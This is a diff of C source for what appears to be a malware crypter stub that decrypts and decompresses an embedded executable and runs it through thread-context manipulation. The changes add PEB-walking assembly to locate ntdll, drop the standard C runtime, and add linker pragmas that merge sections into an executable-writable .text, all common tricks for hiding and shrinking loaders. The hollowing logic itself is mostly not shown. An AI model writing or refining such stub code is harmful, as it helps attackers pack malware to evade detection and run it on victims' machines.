@@ -1,16 +1,12 @@
-#define _CRT_SECURE_NO_WARNINGS
-#ifdef _DEBUG
-//#error No support
-#endif
-
-#include <Windows.h>
-#include <TlHelp32.h>
+#include "crt.h"
 
 #include "../common/common.h"
 
-#include "../common/lz4/lz4.h"
+#include <TlHelp32.h>
 
-#include <stdio.h>
+#pragma comment(linker,"/MERGE:.rdata=.text /MERGE:.data=.text /MERGE:.rdata=.text")
+#pragma comment(linker, "/SECTION:.text,EWR")
+#pragma comment(linker,"/FILEALIGN:128")
 
 BOOL ExecuteFile(LPSTR szFilePath, LPVOID pFile, PHANDLE phThread)
 {
@@ -18,14 +14,14 @@ BOOL ExecuteFile(LPSTR szFilePath, LPVOID pFile, PHANDLE phThread)
 	typedef BOOL(WINAPI* NtSetThreadContext)(HANDLE hThread, PCONTEXT lpContext);
 
 	HMODULE hNtModule = NULL;
-
+	
 #ifdef A86
 	__asm
 	{
 		mov ebx, fs: [0x30]		// Get PEB
 		mov ebx, [ebx + 0xC]	// Get PEB->Ldr
 		mov ebx, [ebx + 0x14]	// Get 1st Entry
-		mov ebx, [ebx]
+		mov ebx, [ebx]			// Get NT DLL
 		mov ebx, [ebx + 0x10]	// Get the entry's base address
 		mov hNtModule, ebx
 	}
@@ -113,7 +109,7 @@ BOOL ExecuteFile(LPSTR szFilePath, LPVOID pFile, PHANDLE phThread)
 }
 
 
-INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow)
+INT WINAPI WinMain()
 {
 	const char szEncryptionKey[] = STUB_DEFAULT_KEY;
 	const char szSeparator[] = STUB_DEFAULT_SEPARATOR;
@@ -167,7 +163,7 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine,
 
 	puExecutableData = (PUCHAR)pDecompressedData;
 #endif
-
+	
 	HANDLE hThread = INVALID_HANDLE_VALUE;
 
 	if (!ExecuteFile(szCurrentFilepath, puExecutableData, &hThread))
